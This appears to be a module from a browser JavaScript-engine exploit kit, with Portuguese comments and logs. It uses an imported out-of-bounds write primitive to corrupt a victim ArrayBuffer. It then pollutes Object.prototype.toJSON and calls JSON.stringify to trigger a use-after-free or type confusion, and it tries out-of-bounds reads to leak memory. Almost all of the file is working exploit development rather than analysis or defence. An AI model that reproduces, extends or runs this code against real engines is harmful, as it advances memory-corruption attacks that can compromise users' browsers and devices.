// js/script3/testJsonTypeConfusionUAFSpeculative.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, isAdvancedInt64Object, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real, oob_dataview_real,
    oob_write_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs';

const TARGETED_UAF_TC_PARAMS = {
    victim_ab_size: 64,
    corruption_offset: (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16, // 0x70
    bytes_to_write_for_corruption: 4,
    ppKeyToPollute: 'toJSON',
};

export let currentCallCount_for_UAF_TC_test = 0;
const MAX_toJSON_DEPTH_FOR_ANALYSIS = 10;

export function detailed_toJSON_for_UAF_TC_test_WithDepthControl_AndSlice() {
    currentCallCount_for_UAF_TC_test++;
    const currentOperationThis = this;
    const FNAME_toJSON_local = `detailed_toJSON_DepthCtrlSlice(Call ${currentCallCount_for_UAF_TC_test})`;

    if (currentCallCount_for_UAF_TC_test === 1) {
        document.title = `detailed_toJSON_Slice Call ${currentCallCount_for_UAF_TC_test}`;
    }

    if (currentCallCount_for_UAF_TC_test <= MAX_toJSON_DEPTH_FOR_ANALYSIS) {
        logS3(`[toJSON Poluído - Detalhado c/ Slice + SpecRead] ${FNAME_toJSON_local} Chamado!`, "vuln");
        logS3(`  [CALL ${currentCallCount_for_UAF_TC_test}] typeof this: ${typeof currentOperationThis}, constructor: ${currentOperationThis?.constructor?.name}`, "info");
    }

    if (currentCallCount_for_UAF_TC_test > MAX_toJSON_DEPTH_FOR_ANALYSIS) {
        if (currentCallCount_for_UAF_TC_test === MAX_toJSON_DEPTH_FOR_ANALYSIS + 1) {
            logS3(`  [CALL ${currentCallCount_for_UAF_TC_test}] Profundidade máxima (${MAX_toJSON_DEPTH_FOR_ANALYSIS}) atingida. Retornando undefined.`, "info");
            document.title = `toJSON Profundidade Máx Atingida (${MAX_toJSON_DEPTH_FOR_ANALYSIS})`;
        }
        return undefined;
    }

    let details = {
        raw_byteLength: "N/A",
        first_dword: "N/A",
        slice_exists: "N/A",
        slice_called: "N/A",
        speculative_read_offset: "N/A",
        speculative_read_value: "N/A",
        type_toString: "N/A"
    };
    let error_accessing_props = null;

    try {
        details.type_toString = Object.prototype.toString.call(currentOperationThis);
        details.raw_byteLength = currentOperationThis.byteLength; // Ainda logamos o byteLength reportado
        logS3(`  [CALL ${currentCallCount_for_UAF_TC_test}] Acesso Direto this.byteLength: ${details.raw_byteLength} (tipo: ${typeof details.raw_byteLength})`, "info");

        if (currentOperationThis instanceof ArrayBuffer && currentCallCount_for_UAF_TC_test === 1) {
            // Leitura do primeiro dword (dentro dos limites originais)
            if (details.raw_byteLength >= 4) { // Checa se o byteLength reportado permite
                try {
                    details.first_dword = new DataView(currentOperationThis, 0, 4).getUint32(0, true);
                } catch (e_fd) {
                    details.first_dword = `ERRO: ${e_fd.message}`;
                }
            }

            // TENTATIVA DE LEITURA ESPECULATIVA (sempre na primeira chamada para o ArrayBuffer)
            // Tentar ler um pouco além do tamanho original, mesmo que byteLength não tenha mudado.
            // Isso testa se o ponteiro de dados interno foi corrompido ou se a checagem de limites foi burlada.
            const speculativeOffset = TARGETED_UAF_TC_PARAMS.victim_ab_size; // Ex: 64
            details.speculative_read_offset = toHex(speculativeOffset);
            try {
                logS3(`  [CALL 1] Tentando leitura ESPECULATIVA em offset ${toHex(speculativeOffset)}...`, "warn");
                // Precisamos de um DataView do 'this'. Se this.byteLength é pequeno, isso pode falhar.
                // Mas se o ponteiro de dados interno está corrompido para uma região maior,
                // e a checagem de limites do DataView usar o byteLength corrompido (ou não checar), poderíamos ler.
                // Para segurança, criamos DataView com o byteLength reportado, mas tentamos ler no offset especulativo.
                // Se o byteLength real não for suficiente, a getUint32 lançará erro.
                const dvSpec = new DataView(currentOperationThis); // Usa o byteLength de currentOperationThis
                let specReadVal = dvSpec.getUint32(speculativeOffset, true);
                details.speculative_read_value = toHex(specReadVal);
                logS3(`  [CALL 1] Leitura ESPECULATIVA em ${toHex(speculativeOffset)} bem-sucedida: ${toHex(specReadVal)}`, "leak");
            } catch (e_spec_read) {
                logS3(`  [CALL 1] ERRO na tentativa de leitura ESPECULATIVA em ${toHex(speculativeOffset)}: ${e_spec_read.message}`, "error");
                details.speculative_read_value = `ERRO: ${e_spec_read.message}`;
                // Não necessariamente um erro fatal para a toJSON, mas informativo.
            }

            // Teste do Slice
            details.slice_exists = (typeof currentOperationThis.slice === 'function');
            if (details.slice_exists) {
                try {
                    logS3(`  [CALL 1] Tentando this.slice(0,1)...`, "info");
                    let slice_result = currentOperationThis.slice(0,1);
                    details.slice_called = `OK, resultado.byteLength = ${slice_result.byteLength}`;
                    logS3(`  [CALL 1] this.slice(0,1) OK. Result byteLength: ${slice_result.byteLength}`, "info");
                } catch (e_slice) {
                    logS3(`  [CALL 1] ERRO ao chamar this.slice(0,1): ${e_slice.message}`, "error");
                    details.slice_called = `ERRO: ${e_slice.message}`;
                    error_accessing_props = error_accessing_props || `SliceFail: ${e_slice.message}`;
                }
            }
        } else if (currentOperationThis?.buffer instanceof ArrayBuffer && currentOperationThis.byteOffset !== undefined && currentCallCount_for_UAF_TC_test === 1) {
             // Para TypedArrays na primeira chamada, caso victim_ab fosse um deles
            if (details.raw_byteLength >= 4) { // raw_byteLength aqui é do TypedArray
                 try {
                    details.first_dword = new DataView(currentOperationThis.buffer, currentOperationThis.byteOffset, 4).getUint32(0, true);
                } catch (e_fd_ta) {
                    details.first_dword = `ERRO_TA: ${e_fd_ta.message}`;
                }
            }
        }


        logS3(`  [CALL ${currentCallCount_for_UAF_TC_test}] Log Final Detalhes: type='${details.type_toString}', byteLength=${details.raw_byteLength}, 1stDword=${(typeof details.first_dword === 'string') ? details.first_dword : toHex(details.first_dword)}, slice_exists=${details.slice_exists}, slice_called=${details.slice_called}, spec_read_offset=${details.speculative_read_offset}, spec_read_val=${details.speculative_read_value}`, "info");

    } catch (e) {
        error_accessing_props = e.message;
        logS3(`  [toJSON Poluído] ${FNAME_toJSON_local} ERRO GERAL ao acessar props: ${e.message}`, "critical");
        document.title = `ERRO toJSON Props Call ${currentCallCount_for_UAF_TC_test}`;
    }

    if (error_accessing_props) {
        return { toJSON_prop_error: true, message: error_accessing_props, call: currentCallCount_for_UAF_TC_test, details_at_error: details };
    }
    return { toJSON_executed_detailed_depth_ctrl_slice: true, call: currentCallCount_for_UAF_TC_test, details: details };
}

export async function executeUAFTypeConfusionTestWithValue(
    testVariantDescription,
    valueToWriteOOB
) {
    const FNAME_TEST = `executeUAFTypeConfusionTest<${testVariantDescription}>`;
    const {
        victim_ab_size,
        corruption_offset,
        bytes_to_write_for_corruption,
        ppKeyToPollute,
    } = TARGETED_UAF_TC_PARAMS;

    logS3(`--- Iniciando Teste UAF/TC (Controle de Profundidade + Slice + SpecRead): ${testVariantDescription} ---`, "test", FNAME_TEST);
    logS3(`   Offset de Corrupção: ${toHex(corruption_offset)}, Valor OOB a ser Escrito: ${toHex(valueToWriteOOB)}`, "info", FNAME_TEST);
    document.title = `Iniciando UAF/TC: ${testVariantDescription}`;

    currentCallCount_for_UAF_TC_test = 0;

    let stringifyResult = null;
    let errorOccurredInStringify = false;
    let potentiallyFroze = true;
    let stepReached = "inicio";

    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha ao configurar ambiente OOB. Abortando.", "error", FNAME_TEST);
        document.title = "ERRO: Falha OOB Setup";
        return { potentiallyFroze: false, errorOccurred: true, calls: currentCallCount_for_UAF_TC_test, stringifyResult };
    }
    document.title = "OOB Configurado";
    stepReached = "oob_configurado";

    let victim_ab = new ArrayBuffer(victim_ab_size);
    logS3(`ArrayBuffer vítima (${victim_ab_size} bytes) recriado.`, "info", FNAME_TEST);
    stepReached = "vitima_criada";

    let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKeyToPollute);
    let pollutionAppliedThisRun = true;

    try {
        logS3(`Aplicando PP com detailed_toJSON_for_UAF_TC_test_WithDepthControl_AndSlice...`, "info", FNAME_TEST);
        document.title = `Aplicando PP: ${testVariantDescription}`;
        stepReached = "aplicando_pp";
        Object.defineProperty(Object.prototype, ppKeyToPollute, {
            value: detailed_toJSON_for_UAF_TC_test_WithDepthControl_AndSlice,
            writable: true, configurable: true, enumerable: false
        });
        logS3(`Object.prototype.${ppKeyToPollute} poluído com lógica atualizada (spec_read).`, "good", FNAME_TEST);
        stepReached = "pp_aplicada";
        document.title = `PP Aplicada: ${testVariantDescription}`;

        logS3(`CORRUPÇÃO: Escrevendo valor ${toHex(valueToWriteOOB)} (${bytes_to_write_for_corruption} bytes) em offset abs ${toHex(corruption_offset)}`, "warn", FNAME_TEST);
        stepReached = "antes_escrita_oob";
        document.title = `Antes Escrita OOB: ${testVariantDescription}`;
        oob_write_absolute(corruption_offset, valueToWriteOOB, bytes_to_write_for_corruption);
        logS3("Escrita OOB realizada.", "info", FNAME_TEST);
        stepReached = "apos_escrita_oob";
        document.title = `Após Escrita OOB: ${testVariantDescription}`;

        await PAUSE_S3(SHORT_PAUSE_S3);

        stepReached = "antes_stringify";
        document.title = `Antes Stringify: ${testVariantDescription}`;
        logS3(`Chamando JSON.stringify(victim_ab)...`, "info", FNAME_TEST);

        try {
            stringifyResult = JSON.stringify(victim_ab);
            stepReached = "apos_stringify";
            document.title = `Stringify Retornou: ${testVariantDescription}`;
            potentiallyFroze = false;
            logS3(`Resultado de JSON.stringify(victim_ab): ${String(stringifyResult).substring(0, 700)}`, "info", FNAME_TEST);
            if (stringifyResult && typeof stringifyResult === 'string' && stringifyResult.includes("toJSON_prop_error:true")) {
                logS3("UAF/TC POTENCIALMENTE DETECTADO: Erro ao acessar propriedade dentro do toJSON.", "vuln", FNAME_TEST);
            }
             if (stringifyResult && typeof stringifyResult === 'string' && stringifyResult.includes("Leitura ESPECULATIVA em") && stringifyResult.includes("bem-sucedida")) {
                logS3("LEITURA ESPECULATIVA BEM-SUCEDIDA DENTRO DO TOJSON!", "critical", FNAME_TEST);
            }
        } catch (e) {
            stepReached = "erro_stringify";
            document.title = `ERRO Stringify (${e.name}): ${testVariantDescription}`;
            potentiallyFroze = false;
            errorOccurredInStringify = true;
            logS3(`ERRO CAPTURADO durante JSON.stringify(victim_ab): ${e.name} - ${e.message}.`, "critical", FNAME_TEST);
            console.error(`JSON.stringify Test Error (${testVariantDescription}):`, e);
        }

    } catch (mainError) {
        stepReached = "erro_principal";
        document.title = `ERRO Principal: ${testVariantDescription}`;
        potentiallyFroze = false;
        errorOccurredInStringify = true;
        logS3(`Erro principal no teste (${testVariantDescription}): ${mainError.message}`, "error", FNAME_TEST);
        console.error(mainError);
    } finally {
        if (pollutionAppliedThisRun) {
            if (originalToJSONDescriptor) {
                Object.defineProperty(Object.prototype, ppKeyToPollute, originalToJSONDescriptor);
            } else {
                delete Object.prototype[ppKeyToPollute];
            }
        }
        clearOOBEnvironment();
        logS3(`Ambiente OOB Limpo. Último passo alcançado: ${stepReached}`, "info", FNAME_TEST);
        if (potentiallyFroze) {
            logS3(`O TESTE PODE TER CONGELADO. Último passo: ${stepReached}. Chamadas toJSON: ${currentCallCount_for_UAF_TC_test}`, "warn", FNAME_TEST);
            document.title = `CONGELOU? Passo: ${stepReached} - Chamadas: ${currentCallCount_for_UAF_TC_test} - ${testVariantDescription}`;
        }
    }
    logS3(`--- Teste UAF/TC Concluído: ${testVariantDescription} (Chamadas toJSON: ${currentCallCount_for_UAF_TC_test}) ---`, "test", FNAME_TEST);
    if (!potentiallyFroze && !errorOccurredInStringify) {
        document.title = `Teste UAF/TC OK: ${testVariantDescription}`;
    }
    return { potentiallyFroze, errorOccurred: errorOccurredInStringify, calls: currentCallCount_for_UAF_TC_test, stringifyResult };
}
